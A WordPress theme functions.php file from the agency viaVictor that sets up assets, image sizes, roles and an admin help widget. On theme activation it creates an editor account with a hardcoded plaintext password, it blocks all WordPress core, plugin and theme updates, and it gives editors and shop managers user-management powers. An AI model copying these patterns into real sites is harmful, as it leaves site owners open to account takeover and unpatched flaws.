<?php
/** IMPORTANT: Autoload theme classes */
spl_autoload_register( function($classname) {
    $class      = str_replace( '\\', DIRECTORY_SEPARATOR, $classname);
    $classpath  = dirname(__FILE__) . DIRECTORY_SEPARATOR . $class . '.php';
    if ( file_exists( $classpath) ) {
        require $classpath;
    }
});

/** IMPORTANT: Check Timber */
if ( ! class_exists( 'Timber' ) ) {
    add_action( 'admin_notices', function() {
        echo '<div class="error"><p>Timber not activated. Make sure you activate the plugin in <a href="' . esc_url( admin_url( 'plugins.php#timber' ) ) . '">' . esc_url( admin_url( 'plugins.php' ) ) . '</a></p></div>';
    } );
    return;
}
Timber::$dirname = array('templates');

/** IMPORTANT: start viaVICTOR STUFF */
Class viaVictorTheme extends \Timber\Site {

    function __construct() {
        add_theme_support( 'post-thumbnails' );
        add_theme_support( 'menus' );
        add_theme_support( 'woocommerce' );

        add_action( 'init', array( $this, 'vv_register_theme_styles' ));
        add_action( 'init', array( $this, 'vv_register_theme_scripts' ));
        add_action( 'init', array( $this, 'vv_register_image_sizes' ));

        add_action( 'widgets_init', array( $this, 'vv_register_widgets'));

        add_filter( 'timber_context', array( $this, 'vv_add_to_context' ) );
        add_filter( 'get_twig', array( $this, 'vv_add_to_twig' ) );

        parent::__construct();

        add_action( 'init', array( $this, 'vv_boost_theme_performance' ) );
        add_action( 'switch_theme', array($this, 'vv_apply_default_settings'));
        add_action( 'admin_menu', array($this, 'vv_custom_admin_menu'));
        add_action( 'admin_init', array( $this, 'vv_do_admin_stuff') );
    }

    /** Add Stylesheet to theme */
    function vv_register_theme_styles() {
        wp_register_style('theme-stylesheet', get_stylesheet_uri(), array(),filemtime( get_template_directory() . '/app.css' ));
        wp_enqueue_style('theme-stylesheet');
    }

    /** Add Scripts to theme */
    function vv_register_theme_scripts() {
        wp_enqueue_script( 'theme-script', get_stylesheet_directory_uri() . '/js/main.js', filemtime( get_template_directory() . '/js/main.js' ), 1, true );
    }

    /** Add Custom Image Sizes */
    function vv_register_image_sizes() {
        remove_image_size('1536x1536');
        remove_image_size('2048x2048');

        //default wordpress sizes: settings > media
        //- thumbnail: 150x150
        //- medium: 500x500
        //- medium_large: 768x768
        //- large: 1200x1200

        //extra sizes vv
        add_image_size( 'square', 500, 500, true);
        add_image_size( 'full_hd', 1920, 1080);
        add_image_size( 'square_hd', 1080, 1080, true);
        add_image_size( 'extra_large', 2400, 1600);
        add_image_size( 'social_media', 1200, 630, true);
    }

    function vv_register_widgets(){
        register_sidebar(array(
           'name' => 'Main sidebar',
           'id' => 'main_sidebar',
           'before_widget' => '<div>',
           'after_widget' => '</div>'
        ));
    }

    /** Add site-data & meta-data for every post to the Timber-context so it can be used everywhere */
    function vv_add_to_context() {
        global $context;

        $post = get_post();
        $context['site'] = $this;
        $context['isMobile'] = wp_is_mobile();
        $context['isFront'] = is_front_page();
        $context['gtmActive'] = trim(GTM_ACTIVE);
        $context['gtmKey'] = trim(GTM_KEY);
        return $context;
    }

    /** Add TwigStringLoader Extension */
    function vv_add_to_twig( $twig ) {
        $twig->addExtension( new Twig_Extension_StringLoader() );
        return $twig;
    }

    /** Custom actions to Boost performance */
    function vv_boost_theme_performance() {
        //Remove Emoji script & styles
        remove_action( 'wp_head', 'print_emoji_detection_script', 7 );
        remove_action( 'wp_print_styles', 'print_emoji_styles' );

        //Remove jQuery
        //add_action( 'wp_enqueue_scripts', array($this, 'vv_remove_jquery'));

        //move jQuery scripts to footer (optional)
        wp_scripts()->add_data( 'jquery', 'group', 1 );
        wp_scripts()->add_data( 'jquery-core', 'group', 1 );
        wp_scripts()->add_data( 'jquery-migrate', 'group', 1 );

        //Remove Gutenberg block-library CSS
        add_action( 'wp_enqueue_scripts', array( $this, 'vv_remove_wp_block_library_css'));
    }

    /** Remove Gutenberg block-library CSS */
    function vv_remove_wp_block_library_css() {
        wp_dequeue_style( 'wp-block-library' );
        wp_dequeue_style( 'wp-block-library-theme' );
        wp_dequeue_style( 'wc-block-style' );
    }

    /** Completely remove jQuery from front-end */
    // function vv_remove_jquery() {
    //     if (!is_admin()) {
    //         wp_dequeue_script( 'jquery');
    //         wp_deregister_script( 'jquery');
    //     }
    // }

    /** Some custom actions for admin */
    function vv_do_admin_stuff() {
        //Custom dahboard-widgets
        add_action('wp_dashboard_setup', array( $this, 'vv_add_dashboard_widgets'));

        //Admin-menu stuff
        add_action('admin_menu', array($this, 'vv_custom_admin_menu'));

        //Disable updates
        add_filter('pre_site_transient_update_core', array($this, 'vv_disable_wp_updates'));
        add_filter('pre_site_transient_update_plugins', array($this, 'vv_disable_wp_updates'));
        add_filter('pre_site_transient_update_themes', array($this, 'vv_disable_wp_updates'));

        //Extra capabilities for editor-users
        call_user_func(array($this, 'vv_add_editor_capabilities'));
        call_user_func(array($this, 'vv_add_shopmanager_capabilities'));
    }

    /** Disable ALL update notifications **/
    function vv_disable_wp_updates() {
        global $wp_version;
        return (object) array('last_checked' => time(), 'version_checked' => $wp_version,);
    }

    /** Set some default settings on theme activation */
    function vv_apply_default_settings() {
        global $wp_rewrite;

        //Add default editor-user
        call_user_func(array($this, 'vv_add_editor_user'));

        //Set options
        $wp_rewrite->set_permalink_structure( '/%postname%/' );

        if (get_option('date_format')) {
            update_option('date_format','d/m/Y');
        }
        if (get_option('date_format')) {
            update_option('time_format','H:i');
        }
    }

    /** Add widgets to admin-dashboard */
    function vv_add_dashboard_widgets() {
        global $wp_meta_boxes;
        wp_add_dashboard_widget('vv_help_widget','Welkom', array( $this, 'vv_dashboard_widget_help'));
    }

    /** Change admin-menu for role 'editor' */
    function vv_custom_admin_menu() {
        if (current_user_can('editor' )) {
            remove_menu_page('tools.php');
            remove_submenu_page( 'themes.php', 'customize.php?return=%2Fwp%2Fwp-admin%2Findex.php');
        }
    }

    /** Add user with role 'editor' */
    function vv_add_editor_user() {
        $username = 'victor19';
        $password = '19$V1ctor-Leeuw-7';
        $email = 'editor@viavictor.com';

        $user_id = username_exists( $username );
        if ( !$user_id && email_exists($email) == false ) {
            $user_id = wp_create_user( $username, $password, $email );
            if( !is_wp_error($user_id) ) {
                $user = get_user_by( 'id', $user_id );
                $user->set_role( 'editor' );
            }
        }
    }

    /** Add extra capabilities for 'editor' */
    function vv_add_editor_capabilities() {
        $role_object = get_role( 'editor' );

        if (!$role_object->has_cap( 'edit_theme_options' ) ) {
            $role_object->add_cap('edit_theme_options');
        }
        if (!$role_object->has_cap( 'list_users' ) ) {
            $role_object->add_cap('list_users');
        }
        if (!$role_object->has_cap( 'edit_users' ) ) {
            $role_object->add_cap('edit_users');
        }
        if (!$role_object->has_cap( 'create_users' ) ) {
            $role_object->add_cap('create_users');
        }
        if (!$role_object->has_cap( 'promote_users' ) ) {
            $role_object->add_cap('promote_users');
        }
        if (!$role_object->has_cap( 'gform_full_access' ) ) {
            $role_object->add_cap('gform_full_access');
        }
        if ($role_object->has_cap( 'customize' ) ) {
            $role_object->remove_cap('customize');
        }

        add_filter('editable_roles', array($this, 'vv_editable_roles'));
    }

    /** Add extra capabilities for 'shopmanager' */
    function vv_add_shopmanager_capabilities() {
        $role_object = get_role( 'shop_manager' );

        if (!$role_object->has_cap( 'edit_theme_options' ) ) {
            $role_object->add_cap('edit_theme_options');
        }
        if (!$role_object->has_cap( 'create_users' ) ) {
            $role_object->add_cap('create_users');
        }
        if (!$role_object->has_cap( 'edit_users' ) ) {
            $role_object->add_cap('edit_users');
        }
        if (!$role_object->has_cap( 'delete_users' ) ) {
            $role_object->add_cap('delete_users');
        }
        if (!$role_object->has_cap( 'promote_users' ) ) {
            $role_object->add_cap('promote_users');
        }
        if (!$role_object->has_cap( 'gform_full_access' ) ) {
            $role_object->add_cap('gform_full_access');
        }

        //remove capabilities
        if ($role_object->has_cap( 'customize' ) ) {
            $role_object->remove_cap('customize');
        }
    }

    /** Remove 'Administrator' from the list of roles if the current user is not an admin */
    function vv_editable_roles( $roles ){
        if( isset( $roles['administrator'] ) && !current_user_can('administrator') ){
            unset( $roles['administrator']);
        }
        return $roles;
    }

    /** Add widget with reference to manual */
    function vv_dashboard_widget_help() {
        echo '
        <div class="default-container">
        <h2>Beste beheerder</h2>
        <hr>
        <p>Je kan je website eenvoudig zelf beheren. Indien nodig, kan je gemakkelijk onze handleiding downloaden. Je mag steeds ons support-team contacteren via <a href="mailto:support@viavictor.com" target="_new"> support@viavictor.com</a>. </p>
            <h4><a href="#" target="_new">Download handleiding</a></h4>
        </div>';
        echo '<div class="default-container">
        <h2>Contacteer ons</h2><hr>
        <p><a href="https://viavictor.com" target="_new">Bezoek onze website</a> </p>
        <p>Tel:<a href="tel:+32 3 294 00 48" target="_new" rel="noopener"> +32 3 294 00 48</a> <br/>
        E-mailadres: <a href="mailto:viavictor@viavictor.com" target="_new">victor@viavictor.com</a> </p>
		</div>';
    }

}
$start = new viaVictorTheme();

/**
 * Write to default debug-file
 * @param $log
 */
function vv_write_log ( $log )  {
    if ( true === WP_DEBUG ) {
        if ( is_array( $log ) || is_object( $log ) ) {
            error_log( print_r( $log, true ) );
        } else {
            error_log( $log );
        }
    }
}


/** Load other Functions-files */
require_once( trailingslashit( get_stylesheet_directory() ) . 'inc/functions/acf_functions.php' );
require_once( trailingslashit( get_stylesheet_directory() ) . 'inc/functions/wp_functions.php' );
require_once( trailingslashit( get_stylesheet_directory() ) . 'inc/functions/cpt_functions.php' );
require_once( trailingslashit( get_stylesheet_directory() ) . 'inc/functions/wp_custom_routing.php' );
require_once( trailingslashit( get_stylesheet_directory() ) . 'inc/functions/woo_functions.php' );

/** END DEFAULT VIAVICTOR STUFF */
?>
